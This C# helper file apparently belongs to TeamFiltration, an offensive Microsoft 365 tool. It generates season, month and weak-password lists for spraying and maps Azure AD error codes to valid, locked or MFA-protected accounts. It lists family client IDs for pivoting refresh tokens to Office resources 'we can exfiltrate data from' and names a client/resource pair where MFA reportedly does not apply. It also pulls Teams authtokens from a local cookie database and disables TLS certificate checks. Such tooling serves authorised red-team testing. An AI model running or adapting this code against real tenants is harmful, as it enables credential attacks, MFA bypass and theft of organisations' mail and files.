using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Data.SQLite;
using System.Globalization;
using System.IdentityModel.Tokens.Jwt;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Authentication;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using TeamFiltration.Handlers;
using TeamFiltration.Models.MSOL;
using TeamFiltration.Models.TeamFiltration;

namespace TeamFiltration.Helpers
{
    public static class Generic
    {
        //https://stackoverflow.com/questions/1365407/c-sharp-code-to-validate-email-address
        public static bool IsValidEmail(string email)
        {
            if (string.IsNullOrEmpty(email))
                return false;

            var trimmedEmail = email.Trim();

            if (trimmedEmail.EndsWith("."))
            {
                return false;
            }
            try
            {
                var addr = new System.Net.Mail.MailAddress(email);
                return addr.Address == trimmedEmail;
            }
            catch
            {
                return false;
            }
        }
        public static string GetValue(this string[] args, string substring)
        {
            if (args.Contains(substring))
                return args[args.GetIndex(substring) + 1];

            return "";

        }

        public static int GetIndex(this string[] args, string substring)
        {

            return args.ToList().FindIndex(a => a == substring);

        }
        public static bool Contains(this string[] args, string substring)
        {

            if (args.ToList().FindIndex(a => a == substring) != -1)
                return true;

            return false;

        }

        public static bool IsAccessTokenValid(string access_token, DateTime retrived)
        {
            try
            {
                //Parse into the JSON object
                BearerTokenResp jsonToken = JsonConvert.DeserializeObject<BearerTokenResp>(access_token);

                //Check that parse did not fail
                if (jsonToken?.access_token == null)
                    return false;


                //Parse the JSON token expiration UNIX timestamp into datetime
                var dateTime = Helpers.Generic.UnixTimeStampToDateTime(Convert.ToInt32(jsonToken.expires_on));

                //Is it valid for the next two minutes?
                if (dateTime >= DateTime.Now.AddMinutes(2))
                    return true;

            }
            catch (Exception)
            {

                return false;
            }


            return false;
        }

        public static bool IsTokenValid(string access_token, DateTime retrived)
        {
            try
            {
                //Parse into the JSON object
                BearerTokenResp jsonToken = JsonConvert.DeserializeObject<BearerTokenResp>(access_token);

                //Check that parse did not fail
                if (jsonToken?.access_token == null)
                    return false;


                //Parse the JSON token expiration UNIX timestamp into datetime
                var dateTime = Helpers.Generic.UnixTimeStampToDateTime(Convert.ToInt32(jsonToken.expires_on));

                //Is it valid for the next two minutes?
                if (dateTime >= DateTime.Now.AddMinutes(2))
                    return true;

                //If not, is the refresh token still valid
                var refreshTokenInt = Convert.ToInt32(jsonToken.refresh_token_expires_in);

                //Is the refresh token still valid for the next two minutes?
                if (retrived.AddSeconds(refreshTokenInt) >= DateTime.Now.AddMinutes(2))
                    return true;

                if (refreshTokenInt == 0)
                    return true;


            }
            catch (Exception)
            {

                return false;
            }


            return false;
        }
        //Frrom https://www.techiedelight.com/validate-url-csharp/
        public static bool IsValidUrl(string url)
        {
            Uri? uriResult;
            return Uri.TryCreate(url, UriKind.Absolute, out uriResult) &&
                    (uriResult.Scheme == Uri.UriSchemeHttp || uriResult.Scheme == Uri.UriSchemeHttps);
        }


        public static string GetTenantId(string access_token)
        {

            JwtSecurityTokenHandler jwsSecHandler = new JwtSecurityTokenHandler();
            JwtSecurityToken jwtSecToken = jwsSecHandler.ReadJwtToken(access_token);

            jwtSecToken.Payload.TryGetValue("tid", out var tidObject);
            return tidObject?.ToString();


        }

        public static JwtSecurityToken GetJwtSecurityToken(string access_token)
        {
            JwtSecurityTokenHandler jwsSecHandler = new JwtSecurityTokenHandler();
            JwtSecurityToken jwtSecToken = jwsSecHandler.ReadJwtToken(access_token);
            return jwtSecToken;
        }

        public static string GetUserId(string access_token)
        {

            JwtSecurityTokenHandler jwsSecHandler = new JwtSecurityTokenHandler();
            JwtSecurityToken jwtSecToken = jwsSecHandler.ReadJwtToken(access_token);

            jwtSecToken.Payload.TryGetValue("oid", out var usernameobject);
            return usernameobject?.ToString();


        }
        public static string GetUsername(string access_token)
        {

            JwtSecurityTokenHandler jwsSecHandler = new JwtSecurityTokenHandler();
            JwtSecurityToken jwtSecToken = jwsSecHandler.ReadJwtToken(access_token);

            jwtSecToken.Payload.TryGetValue("unique_name", out var usernameobject);

            if (string.IsNullOrEmpty(usernameobject?.ToString()))
            {
                return ($"MissingUsername_{GetTenantId(access_token)}");
            }
            return usernameobject?.ToString();


        }

        public static string GetDisplayName(string access_token)
        {

            JwtSecurityTokenHandler jwsSecHandler = new JwtSecurityTokenHandler();
            JwtSecurityToken jwtSecToken = jwsSecHandler.ReadJwtToken(access_token);

            jwtSecToken.Payload.TryGetValue("name", out var displayName);

            return displayName?.ToString();


        }
        public static string MakeValidFileName(string fileName)
        {

            return Path.GetInvalidFileNameChars().Aggregate(fileName, (current, c) => current.Replace(c, '_'));

        }

        public static string FixJsonPath(this string inputPath)
        {
            return inputPath.Replace(Path.DirectorySeparatorChar.ToString(), Path.DirectorySeparatorChar.ToString() + Path.DirectorySeparatorChar.ToString());
        }
        public static string FixOsPath(this string inputPath)
        {
            if (OperatingSystem.IsWindows())
            {
                return inputPath.Replace("/", @"\");

            }
            else
            {
                return inputPath.Replace(@"\", @"/");
            }

        }

        public static class OperatingSystem
        {
            public static bool IsWindows() =>
                RuntimeInformation.IsOSPlatform(OSPlatform.Windows);

            public static bool IsMacOS() =>
                RuntimeInformation.IsOSPlatform(OSPlatform.OSX);

            public static bool IsLinux() =>
                RuntimeInformation.IsOSPlatform(OSPlatform.Linux);
        }



        public static Guid StringToGUID(string value)
        {
            using (MD5 md5Hasher = MD5.Create())
            {
                byte[] data = md5Hasher.ComputeHash(Encoding.Default.GetBytes(value));
                return new Guid(data);
            }

        }
        public static string ToQueryString(NameValueCollection nvc)
        {
            if (nvc == null) return string.Empty;

            StringBuilder sb = new StringBuilder();

            foreach (string key in nvc.Keys)
            {
                if (string.IsNullOrWhiteSpace(key)) continue;

                string[] values = nvc.GetValues(key);
                if (values == null) continue;

                foreach (string value in values)
                {
                    sb.Append(sb.Length == 0 ? "?" : "&");
                    sb.AppendFormat("{0}={1}", Uri.EscapeDataString(key), Uri.EscapeDataString(value));
                }
            }

            return sb.ToString();
        }

        static string UppercaseFirst(string s)
        {
            if (string.IsNullOrEmpty(s))
            {
                return string.Empty;
            }
            return char.ToUpper(s[0]) + s.Substring(1);
        }

        public static DateTime UnixTimeStampToDateTime(double unixTimeStamp)
        {
            // Unix timestamp is seconds past epoch
            System.DateTime dtDateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, System.DateTimeKind.Utc);
            dtDateTime = dtDateTime.AddSeconds(unixTimeStamp).ToLocalTime();
            return dtDateTime;
        }


        //You found an easteregg!
        public static List<(string uri, string clientId)> MFADoesNotApply()
        {
            return new List<(string uri, string clientId)> {

             ("https://clients.config.office.net","ab9b8c07-8f02-4f72-87fa-80105867a763"),
             ("https://wns.windows.com","ab9b8c07-8f02-4f72-87fa-80105867a763")

            }.ToList();

        }
        enum Season
        {
            Spring = 1,
            Summer = 2,
            Autumn = 3,
            Winter = 4
        };

        public static bool IsBewteenTwoDates(this DateTime dt, DateTime start, DateTime end)
        {
            return dt >= start && dt <= end;
        }


        //GenerateMonthsPasswords
        public static string[] GenerateSeasonPasswords()
        {
            var dateTimeNow = DateTime.Now;
            //Passwords need to be English
            CultureInfo ci = new CultureInfo("en-US");
            var passwords = new List<string>() { };



            //Adding last years Winter is probably a good idea if we are early into this year
            var currentSeason = (Season)Math.Ceiling(new PersianCalendar().GetMonth(dateTimeNow) / 3.0);

            if (Season.Spring == currentSeason || Season.Winter == currentSeason)
            {
                passwords.Add(UppercaseFirst("Winter") + dateTimeNow.AddYears(-1).Year);
                passwords.Add(UppercaseFirst("Winter") + dateTimeNow.AddYears(-1).Year + "!");
                passwords.Add(UppercaseFirst("Winter") + "@" + dateTimeNow.AddYears(-1).Year + "!");


                passwords.Add("winter" + dateTimeNow.AddYears(-1).Year);
                passwords.Add("winter" + dateTimeNow.AddYears(-1).Year + "!");
                passwords.Add("winter" + "@" + dateTimeNow.AddYears(-1).Year + "!");
            }
            foreach (var seasonString in Enum.GetNames(typeof(Season)))
            {
                passwords.Add(UppercaseFirst(seasonString) + dateTimeNow.Year);
                passwords.Add(UppercaseFirst(seasonString) + dateTimeNow.Year + "!");
                passwords.Add(UppercaseFirst(seasonString) + "@" + dateTimeNow.Year + "!");

            }

            foreach (var seasonString in Enum.GetNames(typeof(Season)))
            {
                passwords.Add(seasonString + dateTimeNow.Year);
                passwords.Add(seasonString + dateTimeNow.Year + "!");
                passwords.Add(seasonString + "@" + dateTimeNow.Year + "!");

            }


            return passwords.ToArray();


        }
        public static string[] GenerateMonthsPasswords()
        {
            var dateTimeNow = DateTime.Now;
            //Passwords need to be English
            CultureInfo ci = new CultureInfo("en-US");

            var months = ci.DateTimeFormat.MonthNames.Where(x => !string.IsNullOrEmpty(x)).ToArray();

            var passwords = new List<string>() { };

            foreach (var monthString in months)
            {
                passwords.Add(UppercaseFirst(monthString) + dateTimeNow.Year);
                passwords.Add(UppercaseFirst(monthString) + dateTimeNow.Year + "!");
                passwords.Add(UppercaseFirst(monthString) + "@" + dateTimeNow.Year + "!");

            }

            foreach (var monthString in months)
            {
                passwords.Add(monthString + dateTimeNow.Year);
                passwords.Add(monthString + dateTimeNow.Year + "!");
                passwords.Add(monthString + "@" + dateTimeNow.Year + "!");

            }

            return passwords.ToArray();


        }
        public static string[] GenerateWeakPasswords(string companyShortName = "")
        {
            var dateTimeNow = DateTime.Now;
            var passwords = new List<string>() { };

            passwords.Add("P@ssword1");
            passwords.Add("P@ssword123");
            passwords.Add("Password@123");
            passwords.Add("password@123");


            passwords.Add("Welcome@123456");
            passwords.Add("Welcome@1234");
            passwords.Add("Welcome@123");

            passwords.Add("Welcome123456!");
            passwords.Add("Welcome1234!");
            passwords.Add("Welcome123!");

            passwords.Add("Welcome" + dateTimeNow.Year);
            passwords.Add("Welcome" + dateTimeNow.Year + "!");
            passwords.Add("Welcome" + "@" + dateTimeNow.Year + "!");




            return passwords.Distinct().Reverse().ToArray();
        }
        public static IEnumerable<T> Randomize<T>(this IEnumerable<T> source)
        {
            Random rnd = new Random();
            return source.OrderBy<T, int>((item) => rnd.Next());
        }


        public static string CreateMD5(string input)
        {
            // Use input string to calculate MD5 hash
            using (System.Security.Cryptography.MD5 md5 = System.Security.Cryptography.MD5.Create())
            {
                byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);
                byte[] hashBytes = md5.ComputeHash(inputBytes);

                // Convert the byte array to hexadecimal string
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < hashBytes.Length; i++)
                {
                    sb.Append(hashBytes[i].ToString("X2"));
                }
                return sb.ToString();
            }
        }
        public static async Task<List<string>> GenerateCombinations()
        {
            var bufferArray = new List<string>() { };
            var usernameArray = new List<string>() { };
            using (var httpClient = new HttpClient())
            {
                var namesUrl = "https://raw.githubusercontent.com/Flangvik/statistically-likely-usernames/master/john.smith.txt";

                var userListReq = await httpClient.PollyGetAsync(namesUrl);

                var textData = (await userListReq.Content.ReadAsStringAsync()).Split("\n").Where(x => !string.IsNullOrEmpty(x)).ToArray();
                foreach (var item in textData)
                {
                    bufferArray.Add(item.Split(".")[0]);
                    bufferArray.Add(item.Split(".")[1]);
                }

                foreach (var username in bufferArray)
                {
                    foreach (char item in "abcdefghijklmnopqrstuvwxyz")
                    {
                        usernameArray.Add(item + username);
                    }

                }
            }

            return usernameArray.Distinct().ToList();
        }
        public static Dictionary<string, (string msg, bool valid, bool disqualified, bool accessPolicy)> GetErrorCodes()
        {
            var errorCodes = new Dictionary<string, (string msg, bool valid, bool disqualified, bool accessPolicy)>() { };

            errorCodes.Add("AADSTS50034", ("NOT EXIST", false, true, false));
            errorCodes.Add("AADSTS50126", ("INVALID", false, false, false));


            errorCodes.Add("AADSTS50076", ("VALID BUT MFA (76)", true, false, true));
            errorCodes.Add("AADSTS50079", ("VALID, MUST ENROLL MFA", true, false, true));

            errorCodes.Add("AADSTS50053", ("LOCKED", false, false, false));
            errorCodes.Add("AADSTS50057", ("DISABLED", false, true, false));

            errorCodes.Add("AADSTS50055", ("VALID BUT EXPIRED PASSWORD", false, true, false));
            errorCodes.Add("AADSTS50128", ("INVALID TENANT", false, true, false));
            errorCodes.Add("AADSTS50059", ("INVALID TENANT", false, true, false));


            errorCodes.Add("AADSTS53003", ("VALID BUT BLOCKED BY ACCESS POLICY", true, false, true));
            errorCodes.Add("AADSTS50158", ("VALID BUT BLOCKED BY ACCESS POLICY", true, false, true));

            return errorCodes;
        }

        public static List<string> officeResources()
        {
            //We are only really interested in resources we can exfiltrate data from, right?
            return new List<string> {
                "https://api.spaces.skype.com/",
                "https://graph.windows.net",
                "https://graph.microsoft.com/",
                "https://outlook.office365.com/",
                "https://onedrive.live.com/"
            };
        }

        internal static List<(string clientId, string clientName)> clientIds()
        {   //Microsoft Application GUID's stolen from secureworks family-of-client-ids-research
            //If we can request a access token for any of these, we should be able to use it's refresh token
            //To access any other of the resources and by that each applications increased scope access
            //https://github.com/secureworks/family-of-client-ids-research/blob/main/known-foci-clients.csv
            return new List<(string clientId, string clientName)>{
                    ("1fec8e78-bce4-4aaf-ab1b-5451cc387264", "Microsoft Teams"),
                    ("04b07795-8ddb-461a-bbee-02f9e1bf7b46", "Microsoft Azure CLI"),
                    ("1950a258-227b-4e31-a9cf-717495945fc2", "Microsoft Azure PowerShell"),
                    ("00b41c95-dab0-4487-9791-b9d2c32c80f2", "Office 365 Management"),
                    ("26a7ee05-5602-4d76-a7ba-eae8b7b67941", "Windows Search"),
                    ("27922004-5251-4030-b22d-91ecd9a37ea4", "Outlook Mobile"),
                    ("4813382a-8fa7-425e-ab75-3b753aab3abb", "Microsoft Authenticator App"),
                    ("ab9b8c07-8f02-4f72-87fa-80105867a763", "OneDrive SyncEngine"),
                    ("d3590ed6-52b3-4102-aeff-aad2292ab01c", "Microsoft Office"),
                    ("872cd9fa-d31f-45e0-9eab-6e460a02d1f1", "Visual Studio"),
                    ("af124e86-4e96-495a-b70a-90f90ab96707", "OneDrive iOS App"),
                   // ("2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8", "Microsoft Bing Search for Microsoft Edge"),
                    ("844cca35-0656-46ce-b636-13f48b0eecbd", "Microsoft Stream Mobile Native"),
                   // ("87749df4-7ccf-48f8-aa87-704bad0e0e16", "Microsoft Teams - Device Admin Agent"),
                    ("cf36b471-5b44-428c-9ce7-313bf84528de", "Microsoft Bing Search"),
                    ("0ec893e0-5785-4de6-99da-4ed124e5296c", "Office UWP PWA"),
                    ("22098786-6e16-43cc-a27d-191a01a1e3b5", "Microsoft To-Do client"),
                    ("d3590ed6-52b3-4102-aeff-aad2292ab01c", "Outlook"),
                    ("ab9b8c07-8f02-4f72-87fa-80105867a763", "OneNote")

                };
        }

        internal static List<(string userAgent, string platform)> userAgents()
        {
            return new List<(string userAgent, string platform)>(){

                ("Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.117 Mobile Safari/537.36","Android"),
                ("Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1","iPhone"),
                ("Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15","Mac OS"),
                ("Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1.6) Gecko/20091215 Ubuntu/9.10 (karmic) Firefox/3.5.6 GTB7.0","Linux"),
                ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.78","Windows"),
                ("Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 640 LTE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586","Windows Phone"),
                };
        }

        public static (string Uri, string clientId) RandomO365Res()
        {
            var randomResourceUri = officeResources().Randomize().First();
            var randomClientID = clientIds().Randomize().First();

            return (randomResourceUri, randomClientID.clientId);
        }

        public static (string Uri, string clientId) RandomO365Res(string Uri, string clientId)
        {

            var differentResourceUri = officeResources().Where(x => !new Uri(x).Host.Equals(new Uri(Uri).Host)).Randomize().First();
            var differentClientID = clientIds().Where(c => !c.clientId.Equals(clientId)).Randomize().First();

            return (differentResourceUri, differentClientID.clientId);
        }

        public static IEnumerable<List<T>> SplitList<T>(List<T> locations, int nSize = 30)
        {
            for (int i = 0; i < locations.Count; i += nSize)
            {
                yield return locations.GetRange(i, Math.Min(nSize, locations.Count - i));
            }
        }
        public static Uri getTokenResource(string access_token)
        {
            JwtSecurityTokenHandler jwsSecHandler = new JwtSecurityTokenHandler();
            JwtSecurityToken jwtToken = jwsSecHandler.ReadJwtToken(access_token);

            jwtToken.Payload.TryGetValue("aud", out var resourceUri);
            if (!string.IsNullOrEmpty(resourceUri?.ToString()))
            {
                if (IsValidUrl(resourceUri?.ToString()))
                {
                    return new Uri(resourceUri?.ToString());
                }
            }
            return null;
        }
        internal static PulledTokens ParseSingleAccessToken(JwtSecurityToken jwtToken)
        {

            jwtToken.Payload.TryGetValue("aud", out var resourceUri);
            jwtToken.Payload.TryGetValue("appid", out var resourceClientId);
            jwtToken.Payload.TryGetValue("unique_name", out var unique_name);
            jwtToken.Payload.TryGetValue("exp", out var expirationtime);
            jwtToken.Payload.TryGetValue("nbf", out var notValidBefore);
            jwtToken.Payload.TryGetValue("iat", out var issuedAt);
            jwtToken.Payload.TryGetValue("scp", out var scopeData);
            jwtToken.Payload.TryGetValue("pwd_url", out var pwd_url);
            jwtToken.Payload.TryGetValue("e_exp", out var extExpiresIn);

            if (IsValidUrl(resourceUri?.ToString()))
                resourceUri = "https://" + new Uri(resourceUri?.ToString()).Host;

            Console.WriteLine($"[+] Parsed token for user: {unique_name} valid for resource {resourceUri}");


            return new PulledTokens()
            {
                //TODO: Compare with a proper reponse and make sure it looks OK
                //Also error handle please
                DateTime = jwtToken.ValidFrom,

                ResponseData = JsonConvert.SerializeObject(new BearerTokenResp()
                {
                    access_token = jwtToken.RawData,
                    expires_in = expirationtime?.ToString(),
                    expires_on = expirationtime?.ToString(),
                    not_before = notValidBefore?.ToString(),
                    ext_expires_in = extExpiresIn?.ToString(),
                    refresh_token_expires_in = 0,
                    refresh_token = "",
                    pwd_url = pwd_url?.ToString(),
                    token_type = "",
                    scope = scopeData?.ToString(),
                    resource = resourceUri?.ToString(),
                }),
                ResourceUri = resourceUri?.ToString(),
                ResourceClientId = resourceClientId?.ToString(),
                Username = unique_name?.ToString()


            };
        }

        public static bool AreYouAnAdult()
        {
            Console.WriteLine();
            Console.WriteLine("[!] The exfiltration modules does not use FireProx, ORIGIN IP WILL BE LOGGED, are you an adult? (Y/N)");
            var response = Console.ReadLine();

            if (!response.ToUpper().Equals("Y"))
            {
                return false;
            }
            return true;
        }
        public static bool IsDatabaseFile(string filePath)
        {
            byte[] bytes = new byte[17];
            using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                fs.Read(bytes, 0, 16);
            }
            string chkStr = Encoding.ASCII.GetString(bytes);
            if (chkStr.Contains("SQLite format"))
            {
                return true;
            }
            return false;
        }


        public static string ExtractTokensFromTeams(string filePath)
        {
            SQLiteConnection sqliteConnection = new SQLiteConnection($"Data Source={filePath}; Version = 3; New = True; Compress = True;");
            string token = "";
            try
            {
                sqliteConnection.Open();
                SQLiteCommand cmd = sqliteConnection.CreateCommand();
                cmd.CommandText = "SELECT value FROM cookies WHERE name = 'authtoken';";
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        token = reader.GetString(0);
                    }
                }
                return token;
            }
            catch (Exception)
            {
                throw;
            }
        }
        public static async Task<UserRealmResp> CheckUserRealm(string email, GlobalArgumentsHandler _globalProperties)
        {
            var userRealObject = new UserRealmResp() { };

            var url = $"https://login.microsoftonline.com/getuserrealm.srf?login={email}&xml=1";
            var UsGovUrl = $"https://login.microsoftonline.us/getuserrealm.srf?login={email}&xml=1";

            var proxy = new WebProxy
            {
                Address = new Uri(_globalProperties?.TeamFiltrationConfig?.proxyEndpoint),
                BypassProxyOnLocal = false,
                UseDefaultCredentials = false
            };

            var httpClientHandler = new HttpClientHandler
            {
                Proxy = proxy,
                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                {
                    return true;
                },
                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
                UseProxy = _globalProperties.DebugMode
            };

            using (var clientHttp = new HttpClient(httpClientHandler))
            {

                var getAsyncReq = await clientHttp.GetAsync(url);

                if (getAsyncReq.IsSuccessStatusCode)
                {
                    var userRealmData = await getAsyncReq.Content.ReadAsStringAsync();

                    Regex authUrlRegex = new Regex(@"(?<=<AuthUrl>)(.*?)(?=<\/AuthUrl>)", RegexOptions.Compiled | RegexOptions.IgnoreCase);
                    MatchCollection authUrlMatches = authUrlRegex.Matches(userRealmData);
                    if (authUrlMatches.Count > 0)
                    {

                        var AuthUrl = authUrlMatches[0].Value;
                        userRealObject.ThirdPartyAuthUrl = AuthUrl;
                        userRealObject.ThirdPartyAuth = true;
                    }
                    if (userRealmData.Contains("/adfs/ls/?username"))
                        userRealObject.Adfs = true;

                }

                var getAsyncUsGovReq = await clientHttp.GetAsync(UsGovUrl);

                if (getAsyncUsGovReq.IsSuccessStatusCode)
                {
                    var userRealmData = await getAsyncUsGovReq.Content.ReadAsStringAsync();

                    Regex UsGovRegex = new Regex(@"(?<=<CloudInstanceName>)(.*?)(?=<\/CloudInstanceName>)", RegexOptions.Compiled | RegexOptions.IgnoreCase);
                    MatchCollection usGovMatches = UsGovRegex.Matches(userRealmData);
                    if (usGovMatches.Count > 0)
                    {
                        var usGovUrl = usGovMatches[0].Value;
                        if (usGovUrl.Contains("microsoftonline.us"))
                            userRealObject.UsGovCloud = true;
                    }

                }
            }

            return userRealObject;
        }

        public static bool hasValidRecUri(JwtSecurityToken jwtToken)
        {

            jwtToken.Payload.TryGetValue("aud", out var resourceUri);
            if (!string.IsNullOrEmpty(resourceUri?.ToString()))
            {
                return IsValidUrl(resourceUri?.ToString());
            }
            return false;
        }
    }
}
